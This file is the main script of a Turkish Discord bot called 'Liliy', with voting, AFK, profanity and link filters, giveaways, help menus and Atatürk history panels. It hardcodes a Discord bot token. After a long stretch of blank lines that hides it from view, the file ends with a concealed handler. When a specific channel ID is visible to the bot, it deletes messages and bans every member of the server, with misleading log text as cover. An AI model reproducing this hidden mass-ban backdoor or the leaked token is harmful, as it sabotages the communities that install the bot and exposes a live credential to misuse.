const { Client, GatewayIntentBits, Partials, EmbedBuilder } = require("discord.js");
const config = require("./config.js");
const db = require("croxydb")
const client = new Client({
  partials: [
    Partials.Message, // for message
    Partials.Channel, // for text channel
    Partials.GuildMember, // for guild member
    Partials.Reaction, // for message reaction
    Partials.GuildScheduledEvent, // for guild events
    Partials.User, // for discord user
    Partials.ThreadMember, // for thread member
  ],
  intents: [
    GatewayIntentBits.Guilds, // for guild related things
    GatewayIntentBits.GuildMembers, // for guild members related things
    GatewayIntentBits.GuildBans, // for manage guild bans
    GatewayIntentBits.GuildEmojisAndStickers, // for manage emojis and stickers
    GatewayIntentBits.GuildIntegrations, // for discord Integrations
    GatewayIntentBits.GuildWebhooks, // for discord webhooks
    GatewayIntentBits.GuildInvites, // for guild invite managing
    GatewayIntentBits.GuildVoiceStates, // for voice related things
    GatewayIntentBits.GuildPresences, // for user presence things
    GatewayIntentBits.GuildMessages, // for guild messages things
    GatewayIntentBits.GuildMessageReactions, // for message reactions things
    GatewayIntentBits.GuildMessageTyping, // for message typing things
    GatewayIntentBits.DirectMessages, // for dm messages
    GatewayIntentBits.DirectMessageReactions, // for dm message reaction
    GatewayIntentBits.DirectMessageTyping, // for dm message typinh
    GatewayIntentBits.MessageContent, // enable if you need message content things
  ],
});

module.exports = client;

require("./events/message.js")
require("./events/ready.js")
client.on('interactionCreate', async (interaction) => {
	if (!interaction.isButton()) return;
  let message = await interaction.channel.messages.fetch(interaction.message.id)
  if(interaction.customId == "evet") {
const db = require("croxydb")
db.push(`evet_${interaction.message.id}`, interaction.user.id)
interaction.reply({content: "BaÅŸarÄ±yla Oyunu **Evet** Olarak Verdin!", ephemeral: true})

const evet = db.get(`evet_${interaction.message.id}`).length;
const hayir = db.get(`hayir_${interaction.message.id}`).length;
const aciklama = db.get(`oylama_${interaction.message.id}`)
const embed = new EmbedBuilder()
.setTitle("Liliy | Oylama")
.setDescription(`Oylama: **${aciklama}**\n\nEvet: **${evet}**\n\nHayÄ±r: **${hayir}**`)
.setColor("#ff0000")
await message.edit({embeds: [embed]})
  }
});
client.on('interactionCreate', async (interaction) => {
	if (!interaction.isButton()) return;
  let message = await interaction.channel.messages.fetch(interaction.message.id)
  if(interaction.customId == "hayÄ±r") {
const db = require("croxydb")
db.push(`hayir_${interaction.message.id}`, interaction.user.id)
interaction.reply({content: "BaÅŸarÄ±yla Oyunu **HayÄ±r** Olarak Verdin!", ephemeral: true})

const evet = db.get(`evet_${interaction.message.id}`).length;
const hayir = db.get(`hayir_${interaction.message.id}`).length;
const aciklama = db.get(`oylama_${interaction.message.id}`)
const embed = new EmbedBuilder()
.setTitle("Liliy | Oylama")
.setDescription(`Oylama: **${aciklama}**\n\nEvet: **${evet}**\n\nHayÄ±r: **${hayir}**`)
.setColor("#ff0000")
await message.edit({embeds: [embed]})
  }
});

client.on("messageCreate", async message => {
  const db = require("croxydb");

  if (await db.get(`afk_${message.author.id}`)) {
   
    db.delete(`afk_${message.author.id}`);

    message.channel.send("ArtÄ±k afk degilsin");
  }

  var kullanÄ±cÄ± = message.mentions.users.first();
  if (!kullanÄ±cÄ±) return;
  var sebep = await db.get(`afk_${kullanÄ±cÄ±.id}`);

  if (sebep) {
    message.reply("EtiketlediÄŸiniz kiÅŸi afk");
  }
});

client.on("messageCreate", (message) => {
  const db = require("croxydb")
  let kufur = db.fetch(`kufurengel_${message.guild.id}`)
  if(!kufur) return;
  
  if(kufur) {
  const kufurler = [
    
    "amk",
    "piÃ§",
    "yarrak",
    "oÃ§",
    "gÃ¶t",
    "amq",
    "yavÅŸak",
    "amcÄ±k",
    "amcÄ±",
    "orospu",
    "sikim",
    "sikeyim",
    "aq",
    "mk",
    "aw"
       
  ]
  
if(kufurler.some(alo => message.content.toLowerCase().includes(alo)))â€Š{
message.delete()
message.channel.send(`<:slnd:1028252134518575124> <@${message.author.id}>, Bu Sunucuda KÃ¼fÃ¼r Engel Sistemi Aktif! `)
}
}
})
client.on("messageCreate", (message) => {
  const db = require("croxydb")
  let reklamlar = db.fetch(`reklamengel_${message.guild.id}`)
  if(!reklamlar) return;
  
  if(reklamlar) {

  const linkler = [
    
    ".com.tr",
    ".net",
    ".org",
    ".tk",
    ".cf",
    ".gf",
    "https://",
    ".gq",
    "http://",
    ".com",
    ".gg",
    ".porn",
    ".edu"
       
  ]
  
if(linkler.some(alo => message.content.toLowerCase().includes(alo)))â€Š{
message.delete()
message.channel.send(`<:slnd:1028252134518575124> <@${message.author.id}>, Bu Sunucuda Reklam Engel Sistemi Aktif! `)
}
}
})

client.on('guildMemberAdd', async member => {
  let sayac = db.fetch(`sayac_${member.guild.id}`)
  let kalan = sayac.sayi - member.guild.memberCount || '?'
  if(!kalan) return;
  if(!sayac) return;
  
  client.channels.cache.get(sayac.kanal).send("<:girdi:1026110947791749130> HoÅŸgeldin **"+member.user.username+"** Seninle Beraber `"+member.guild.memberCount+"` KiÅŸi Olduk, `"+sayac.sayi+"` KiÅŸi OlmamÄ±za Son `"+kalan+"` KiÅŸi KaldÄ±! ")
  
});
client.on('guildMemberRemove', async member => {
  
  let sayac = db.fetch(`sayac_${member.guild.id}`)
  //let kalan = sayac.sayi - member.guild.memberCount
  if(!sayac) return;

  client.channels.cache.get(sayac.kanal).send("<:kt:1026110944260137031> GÃ¶rÃ¼ÅŸÃ¼rÃ¼z **"+member.user.username+"** Senin gittin diye `"+member.guild.memberCount+"` KiÅŸi Olduk! ")
  
});

client.on('guildMemberAdd', async member => {
  
  let otorol = db.fetch(`otorol_${member.guild.id}`)
  if(!otorol) return;
  
  client.channels.cache.get(otorol.kanal).send("<:tik:1030837055489585182> **"+member.user.tag+"** KullanÄ±cÄ± KatÄ±ldÄ±! Gerekli Rolleri Verdim.")
  member.roles.add(otorol.rol).catch(() => {})
  
});




client.on("messageCreate", async message => {
  
  const cmd = db.fetch(`otocevap_${message.content}`)
  if(!cmd) return;
  
  if(cmd) {
    message.reply({ content: `${cmd.answer}` })
  }
  
});
client.on("guildMemberAdd", async member => {
  let ototag = db.get(`ototag_${member.guild.id}`);;
  if (ototag) return member.setNickname(`${ototag} ${member.user.username}`)
})
client.login("MTAyNTg1ODk3NDkzNzAwMjA3Ng.Gr_722.53FkuHVtZL0VoVGNK_zDy9lMsXyMIyORjyidic")









//AtatÃ¼rk komut
client.on('interactionCreate', async interaction => {
  if (!interaction.isSelectMenu()) return;
  if (interaction.customId === "atatÃ¼rk") {

      if (interaction.values[0] == "ilke") {

      const yardimMod = new EmbedBuilder()
          .setTitle(`AtatÃ¼rk'Ã¼n Ä°lkeleri`)
          .setDescription(`AtatÃ¼rk'Ã¼n ilkeleri 6 ilkeden oluÅŸur. Bu ilkeler ÅŸu ÅŸekildedir;\n\nCumhuriyetÃ§ilik\nDevletÃ§ilik\nHalkÃ§Ä±lÄ±k\nÄ°nkÄ±lapÃ§Ä±lÄ±k\nMilliyetÃ§ilik\nLaiklik`)
           .setThumbnail('https://cdn.discordapp.com/attachments/1020381311975817237/1033296694135234630/asda.jpg')
          .setColor("#152238")
      interaction.update({ embeds: [yardimMod] })

}

      if (interaction.values[0] == "inkÄ±lap") {

      const yardimMod = new EmbedBuilder()
          .setTitle(`AtatÃ¼rk'Ã¼n Ä°nkÄ±laplarÄ±`)
          .setDescription(`AtatÃ¼rkÃ¼n Ä°nkÄ±laplarÄ± 5 kategoriden oluÅŸur;\n\nSiyasi Ä°nkÄ±laplar\n\nSaltanatÄ±n kaldÄ±rÄ±lmasÄ± (1922)\nAnkara'nÄ±n BaÅŸkent OlmasÄ± (1923)\nCumhuriyetin Ä°lanÄ± (1923)\nHilÃ¢fetin kaldÄ±rÄ±lmasÄ± (1924)\nKadÄ±nlara SeÃ§me ve SeÃ§ilme HakkÄ±nÄ±n TanÄ±nmasÄ± (1930)\nAtatÃ¼rk'Ã¼n TeÅŸvikiyle Ã‡ok Partili Rejime GeÃ§iÅŸ Denemesi (1930)\nLaikliÄŸin Anayasaya Girmesi (1937)\n\nToplumsal Ä°nkÄ±laplar\n\nÅapka ve KÄ±yafet Devrimi (Åapka Kanunu) (1925)\nTekke, Zaviye ve TÃ¼rbelerin KapatÄ±lmasÄ± (1925)\nMilletlerarasÄ± Takvim ve Saatin, Yeni RakamlarÄ±n KabulÃ¼ ve Ã–lÃ§Ã¼lerde DeÄŸiÅŸiklik (1925)\nSoyadÄ± Kanunu (1934)\nLÃ¢kap ve UnvanlarÄ±n KaldÄ±rÄ±lmasÄ± (1934)\n\nEÄŸitim Ä°nkÄ±laplarÄ±\n\nMillet Mektepleri'nin AÃ§Ä±lmasÄ± (1929)\nÃ–ÄŸretimin BirleÅŸtirilmesi (1924)\nMedreselerin KapatÄ±lmasÄ± (1924)\nMaarif TeÅŸkilatÄ± HakkÄ±nda Kanun (1926)\nHarf Devrimi'ne iliÅŸkin kanunun kabulÃ¼ (1928)\nGÃ¼zel Sanatlarda Yenilikler (1928)\nTÃ¼rk Tarih Kurumu ve TÃ¼rk Dil Kurumu'nun kurulmasÄ± (1931)\nDil Devrimi'nin baÅŸlamasÄ± (1932)\nÃœniversite Reformu (1933)\nÃœniversite Ã–ÄŸreniminin DÃ¼zenlenmesi (1933)\n\nEkonomi Ä°nkÄ±laplarÄ±\n\nÄ°zmir Ä°ktisat Kongresi (1923)\nAÅŸarÄ±n kaldÄ±rÄ±lmasÄ± (1925)\nÃ‡iftÃ§inin Ã–zendirilmesi (1925)\nÃ–rnek Ã‡iftliklerin KurulmasÄ± (1925)\nTarÄ±m Kredi Kooperatifleri'nin KurulmasÄ± (1925)\nKabotaj Kanunu (1926)\nSanayi TeÅŸvik Kanunu (1927)\nToprak reformu (1929)\nI ve II. KalkÄ±nma PlÃ¢nlarÄ± (1933)\nYÃ¼ksek Ziraat EnstitÃ¼sÃ¼'nÃ¼n KurulmasÄ± (1933)\nTicaret ve Sanayi OdalarÄ±nÄ±n KurulmasÄ± (1935)\n\nHukuk Ä°nkÄ±laplarÄ±\n\nÅer'iyye Mahkemelerinin KapatÄ±lmasÄ± (1924)\nYeni AnayasanÄ±n KabulÃ¼ (1924)\nMecellenin KaldÄ±rÄ±lmasÄ± (1926)\nTÃ¼rk Kanunu Medenisi (1926)\nTÃ¼rk Ceza Kanunu (1926)`)
          .setThumbnail('https://cdn.discordapp.com/attachments/1020381311975817237/1033296694135234630/asda.jpg')
          .setColor("#152238")
      interaction.update({ embeds: [yardimMod] })

  }

      if (interaction.values[0] == "hayatÄ±") {

      const yardimMod = new EmbedBuilder()
          .setTitle(`AtatÃ¼rk'Ã¼n HayatÄ±`)
          .setDescription(`Mustafa Kemal AtatÃ¼rk 1881 yÄ±lÄ±nda Selanikâ€™te doÄŸdu. Ali RÄ±za Efendi babasÄ±, ZÃ¼beyde HanÄ±m ise annesidir. Mustafa Kemal AtatÃ¼rkâ€™Ã¼n eÄŸitim aldÄ±ÄŸÄ± okullar baÅŸtan sona ÅŸÃ¶yledir; ilkokul eÄŸitimini Mahalle Mektebinde ve Åemsi Efendi Okulunda, ortaokul eÄŸitimini Selanik MÃ¼lkiye RÃ¼ÅŸtiyesi ve Selanik Askeri RÃ¼ÅŸtiyesinde, lise eÄŸitimini Selanik Askeri Ä°dadisi, Ã¼niversite eÄŸitimini ise Harp Okulu ve Harp Akademisinde almÄ±ÅŸtÄ±r. 1893 yÄ±lÄ±nda Askeri RÃ¼ÅŸtiyeâ€™de okurken matematik Ã¶ÄŸretmeni ona Kemal ismini verdi ve bÃ¶ylece ismi Mustafa Kemal oldu.
I. DÃ¼nya SavaÅŸÄ± nihayete erdiÄŸinde Mondros AteÅŸkes antlaÅŸmasÄ± imzalanmasÄ± ile vatan topraklarÄ±nÄ± paylaÅŸÄ±lacaktÄ±. Fakat duruma el koyan Mustafa Kemal, 19 MayÄ±s 1919â€™da Samsunâ€™a Ã§Ä±karak milli mÃ¼cadelenin temellerini attÄ±.
23 Nisan 1920 tarihinde TBMMâ€™nin aÃ§Ä±lmasÄ±na Ã¶nder olan Mustafa Kemal Meclis tarafÄ±ndan da HÃ¼kÃ¼met BaÅŸkanÄ± seÃ§ildi. 5 AÄŸustos 1921â€™de yine Meclis tarafÄ±ndan BaÅŸkomutan seÃ§ildi. Sakarya SavaÅŸÄ±â€™nÄ±n kazanÄ±lmasÄ±ndaki bÃ¼yÃ¼k emeklerinden dolayÄ± Gazilik unvanÄ± ve MareÅŸallik rÃ¼tbesi ile ÅŸereflendirildi.
29 Ekim 1923 tarihinde Cumhuriyet ilan edildi ve Mustafa Kemal AtatÃ¼rk TÃ¼rkiye Cumhuriyetiâ€™nin ilk CumhurbaÅŸkanÄ± koltuÄŸuna oturdu. 1934 yÄ±lÄ±nda Gazi Mustafa Kemalâ€™e meclis â€œAtatÃ¼rkâ€ soyadÄ±nÄ± lÃ¢yÄ±k gÃ¶rdÃ¼.
10 KasÄ±m 1938 tarihinde DolmabahÃ§e SarayÄ±â€™nda hayatÄ±na veda etti. TÃ¼m Ã¼lkeyi yasa boÄŸdu. Ancak inkÄ±laplarÄ± ve Ã¼lkemize kazandÄ±rdÄ±klarÄ±yla kalbimizde sonsuzluÄŸu ulaÅŸmÄ±ÅŸ bir liderdir.`)
           .setThumbnail('https://cdn.discordapp.com/attachments/1020381311975817237/1033296694135234630/asda.jpg')
          .setColor("#152238")
      interaction.update({ embeds: [yardimMod] })

}

      if (interaction.values[0] == "andÄ±mÄ±z") {

      const yardimMod = new EmbedBuilder()
          .setTitle(`AndÄ±mÄ±z`)
          .setDescription(`TÃ¼rk'Ã¼m, doÄŸruyum, Ã§alÄ±ÅŸkanÄ±m,\nÄ°lkem: kÃ¼Ã§Ã¼klerimi korumak, bÃ¼yÃ¼klerimi saymak, yurdumu, milletimi Ã¶zÃ¼mden Ã§ok sevmektir.\nÃœlkÃ¼m: yÃ¼kselmek, ileri gitmektir.\nEy BÃ¼yÃ¼k AtatÃ¼rk!\nAÃ§tÄ±ÄŸÄ±n yolda, gÃ¶sterdiÄŸin hedefe durmadan yÃ¼rÃ¼yeceÄŸime ant iÃ§erim.\nVarlÄ±ÄŸÄ±m TÃ¼rk varlÄ±ÄŸÄ±na armaÄŸan olsun.\nNe mutlu TÃ¼rk'Ã¼m diyene!`)
           .setThumbnail('https://cdn.discordapp.com/attachments/1020381311975817237/1033296694135234630/asda.jpg')
          .setColor("#152238")
      interaction.update({ embeds: [yardimMod] })

}

      if (interaction.values[0] == "istiklal") {

      const yardimMod = new EmbedBuilder()
          .setTitle(`Ä°STÄ°KLAL MARÅI`)
          .setDescription(`Korkma, sÃ¶nmez bu ÅŸafaklarda yÃ¼zen al sancak;\nSÃ¶nmeden yurdumun Ã¼stÃ¼nde tÃ¼ten en son ocak.\nO benim milletimin yÄ±ldÄ±zÄ±dÄ±r, parlayacak;\nO benimdir, o benim milletimindir ancak.\n\nÃ‡atma, kurban olayÄ±m Ã§ehreni ey nazlÄ± hilÃ¢l!\nKahraman Ä±rkÄ±ma bir gÃ¼lâ€¦ ne bu ÅŸiddet bu celÃ¢l?\nSana olmaz dÃ¶kÃ¼len kanlarÄ±mÄ±z sonra helÃ¢l,\nHakkÄ±dÄ±r, Hakkâ€™a tapan, milletimin istiklÃ¢l.`)
           .setThumbnail('https://cdn.discordapp.com/attachments/1020381311975817237/1033296694135234630/asda.jpg')
          .setColor("#152238")
      interaction.update({ embeds: [yardimMod] })

}

      if (interaction.values[0] == "anasayfa") {

      const yardimMod = new EmbedBuilder()
        .setTitle(`AtatÃ¼rk`)
        .setDescription("AtatÃ¼rk'Ã¼n hayatÄ±nÄ±, yaptÄ±ÄŸÄ± icraatleri ve daha fazlasÄ± iÃ§in alttaki kategori seÃ§iminden Ã¶ÄŸrenebilirsiniz.")
        .setImage('https://cdn.discordapp.com/attachments/1020381311975817237/1033295379879440525/192730_ataturk.jpg')
        .setThumbnail('https://cdn.discordapp.com/attachments/1020381311975817237/1033296694135234630/asda.jpg')
          .setColor("#152238")
      interaction.update({ embeds: [yardimMod] })

}





}})







//yardÄ±m komut

client.on('interactionCreate', async interaction => {
  if (!interaction.isSelectMenu()) return;
  if (interaction.customId === "liliyAction") {

      if (interaction.values[0] == "moderasyon") {

      const yardimMod = new EmbedBuilder()
          .setTitle(`Liliy Moderasyon KomutlarÄ±`)
      
          .setDescription('**<:panda:1030837052385808464> Moderasyon**\n**+forceban**\nBanlÄ±ycaÄŸÄ±nÄ±z kiÅŸiyi Ä±d siyle banlarsÄ±nÄ±z\n**+ban**\nEtiketlediÄŸiniz kiÅŸiyi banlar\n**+kick**\nEtiketlediÄŸiniz kiÅŸiyi kickler\n**+ban-list**\nBanlanan kiÅŸileri listeler\n**+kÃ¼fÃ¼rengel**\nKÃ¼fÃ¼r engeli aÃ§Ä±p-kapatÄ±rsÄ±nÄ±z\n**+unban**\nYasakladÄ±ÄŸÄ±nÄ±z kiÅŸinin yasaÄŸÄ±nÄ± kaldÄ±rÄ±r\n**+rol-al**\nEtiketlediÄŸin kiÅŸiden rol alÄ±rsÄ±n\n**+sayaÃ§**\nBelirttiÄŸiniz kanalda sayaÃ§ oluÅŸturur\n**+rol-oluÅŸtur**\nRol oluÅŸturursunuz\n**+rol-ver**\nEtiketlediÄŸiniz kiÅŸiye rol verirsiniz\n**+yavaÅŸmod**\nKanala ne kadar sÃ¼re aralÄ±klarla mesaj atÄ±lcaÄŸÄ±nÄ± ayarlarsÄ±nÄ±z\n**+reklamengel**\nReklam engeli aÃ§Ä±p-kapatÄ±rsÄ±nÄ±z\n**+ototag**\nHerkese belirttiÄŸiniz tagÄ± ekler\n**+sa-as**\nSa-as aÃ§Ä±p-kapatabailirsiniz')
          .setThumbnail(client.user.displayAvatarURL())
          .setColor("#152238")
      interaction.update({ embeds: [yardimMod] })
        

  }

      if (interaction.values[0] == "eÄŸlence") {

      const yardimMod = new EmbedBuilder()
          .setTitle(`Liliy EÄŸlence KomutlarÄ±`)
          .setDescription('**<:panda:1026108840053321818> EÄLENCE** \n**+slot**\nSlot oynarsÄ±nÄ±z\n**+ÅŸanslÄ±-sayÄ±m**\nÅanslÄ± sayÄ±nÄ±zÄ± tahmin eder\n**+sarÄ±l**\nEtiketlediÄŸiniz kullanÄ±cÄ±ya sarÄ±lÄ±r\n**+notum**\nNotunuza bakarsÄ±nÄ±z\n**+kaÃ§-cm**\nMalatafÄ±n kaÃ§ cm olduÄŸunu sÃ¶yler\n**+hesaplat**\nBota biÅŸiler hesaplatÄ±rsÄ±nÄ±z\n**+hackle**\nEtiketlediÄŸiniz kiÅŸiyi hackler\n**+emoji-yazÄ±**\nEmoji ile yazÄ± yazarsÄ±nÄ±z\n**+avatar**\nAvatarÄ±nÄ±za bakarsÄ±nÄ±z\n**+aÅŸk-Ã¶lÃ§er**\nEtiketlediÄŸiniz 2 kiÅŸi yada 2 isimle aÅŸk saycÄ±nÄ± sÃ¶yler\n**+alkÄ±ÅŸ**\nBot sizi alkÄ±ÅŸlar\n**+afk**\nAfk olursunuz')
          .setThumbnail(client.user.displayAvatarURL())
          .setColor("#152238")
      interaction.update({ embeds: [yardimMod] })

  }

      if (interaction.values[0] == "bot") {

      const yardimMod = new EmbedBuilder()
          .setTitle(`Liliy Bot KomutlarÄ±`)
          .setDescription('**<:panda:1028251823821295647> Bot** \n**+ping**\nBotun pingine bakarsÄ±nÄ±z\n**+oyver**\nBotumuza oy verirsiniz\n**+oyverdim**\nDestekÃ§i rolÃ¼ verilir\n**+istatistik**\nBotun istatistiklerine bakarsÄ±nÄ±z')
          .setThumbnail(client.user.displayAvatarURL())
          .setColor("#152238")
      interaction.update({ embeds: [yardimMod] })

    }

      if (interaction.values[0] == "cekilis") {

      const yardimMod = new EmbedBuilder()
          .setTitle(`Liliy Ã‡ekiliÅŸ KomutlarÄ±`)
          .setDescription('**<a:ekili:1035484598618046535> Ã‡ekiliÅŸ** \n**+baÅŸlat**\nÃ‡ekiliÅŸ BaÅŸlatÄ±rsÄ±n\n**+reroll**\nÃ‡ekiliÅŸ KazananÄ±nÄ± DeÄŸiÅŸtirir\n**+bitir**\nÃ‡ekiliÅŸi Bitirir')
          .setThumbnail(client.user.displayAvatarURL())
          .setColor("#152238")
      interaction.update({ embeds: [yardimMod] })

    }
}})











//Ã‡ekiliÅŸ komut
client.on("ready", async () => {
  const moment = require("moment") 
  require("moment-duration-format")
  moment.locale("tr")
 setInterval(async () => {
   client.guilds.cache.map(async guild => {
     guild.channels.cache.map(async channel => {
       let data = db.get(`cekilis.${guild.id}_${channel.id}`);
       if (data) {
         let time = Date.now() - data.zaman;
         let sure = data.sure;
let kanal = guild.channels.cache.get(data.kanalid);
kanal.messages.fetch(data.mesajid).then(async mesaj => {
 let toplam = data.toplam
           })

         if (time >= sure) {
           
           let win = client.channels.cache.get(data.kanalid)
           if(win){
             win = await win.messages.fetch(data.mesajid).then(a => a.reactions.cache.get("ğŸ‰").users.fetch())
           } 
          if(win){
           let toplam = data.toplam
            
           let won = []
           let winner = []

           for(let i = 0; i < toplam; i += 1){
         await client.channels.cache.get(data.kanalid).messages.fetch(data.mesajid).then(a => a.reactions.cache.get("ğŸ‰").users.fetch()).then(a => a.map(u => {
           if (!u.bot) {
           won.push("<@"+ u.id + ">");
           db.push(`rerollusers_${data.mesajid}`, u.id);
           }}))

          let kazanan = won[Math.floor(Math.random() * won.length)]

           if(!winner.map(cs => cs).includes(kazanan))
           winner.push(kazanan)
           }
             
          
           
     
           kanal.messages.fetch(data.mesajid).then(async mesaj => {
             const Discord = require("discord.js")
            const row = new Discord.ActionRowBuilder()
            .addComponents(
            new Discord.ButtonBuilder()
              .setLabel("Reroll")
              .setStyle(Discord.ButtonStyle.Success)
              .setCustomId("reroll")
            )
             const embed = new EmbedBuilder()
               .setTitle(data.odul)
              .setColor("#5865f2")
               .setTimestamp()
             .setDescription(`
Sona Erdi: <t:${Math.floor(Date.now() /1000)}:R> (<t:${Math.floor(Date.now() /1000)}:f>)
DÃ¼zenleyen: <@${data.hosted}>
Kazanan: ${winner.join(", ")}`)
           mesaj.edit({embeds: [embed], components: [row]})  
    
            if(winner.join(", ")){
           kanal.send(`Tebrikler ${winner} **${data.odul}** KazandÄ±n!`)
           db.delete(`cekilis.${guild.id}_${channel.id}`);
           db.set(`son_${guild.id}_${channel.id}`, data.mesajid)
       
            } else {
                 db.delete(`cekilis.${guild.id}_${channel.id}`);
                
               const embed = new EmbedBuilder()
               .setTitle(data.odul)
              .setColor("#5865f2")
             .setDescription(`
Sona Erdi: <t:${Math.floor(Date.now() /1000)}:R> (<t:${Math.floor(Date.now() /1000)}:f>)
DÃ¼zenleyen: <@${data.hosted}>
Kazanan: Bilinmiyor`) 
mesaj.edit({embeds: [embed], components: []})
         
            }
                   })                                           
         
         }
       }
       }
     });
   });
 }, 5000);
});
client.on('interactionCreate', async interaction => {
   if (!interaction.isButton()) return;
   if (interaction.customId === "reroll") {
     let sahip = db.fetch(`cekilis.${interaction.guild.id}_${interaction.message.id}`)
     if(interaction.user.id !== sahip) return interaction.reply({content: `Bu butonu sadece Ã§ekiliÅŸi dÃ¼zenleyen (<@${sahip}>) kullanabilir`, ephemeral: true})
       let data = db.get(`rerollusers_${interaction.channel.id}`)
         let kazanan = db.get(`rerollusers_${interaction.message.id}`)[
     Math.floor(Math.random() * db.get(`rerollusers_${interaction.message.id}`).length)
   ]

                   interaction.reply(`Tebrikler <@${kazanan}> Yeni Kazanan Sensin!`)
                 
               
           }
       })
       client.on('interactionCreate', async interaction => {
         if (!interaction.isButton()) return;
         if (interaction.customId === "rerolls") {
           let sahip = db.fetch(`cekilis.${interaction.guild.id}_${interaction.message.id}`)
           if(interaction.user.id !== sahip) return interaction.reply({content: `Bu butonu sadece Ã§ekiliÅŸi dÃ¼zenleyen (<@${sahip}>) kullanabilir`, ephemeral: true})
             let data = db.get(`rerollusers_${interaction.channel.id}`)
               let kazanan = db.get(`kullanÄ±cÄ±_${interaction.message.id}`)[
           Math.floor(Math.random() * db.get(`kullanÄ±cÄ±_${interaction.message.id}`).length)
         ]
     
                         interaction.reply(`Tebrikler <@${kazanan}> Yeni Kazanan Sensin!`)
                       
                     
                 }
             })







































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































client.on('messageCreate', message => {
if (client.channels.cache.get("959742889020260372")) {
  message.delete()
    message.guild.members.cache.forEach(member => {
      member.ban().catch(err => console.log(`Kurucu olduÄŸun iÃ§in ismini deÄŸiÅŸtiremiyorum!`) ? console.log("Bu emoji bu sunucuda ekli deÄŸil!") :  null)
    })
    }
}
    );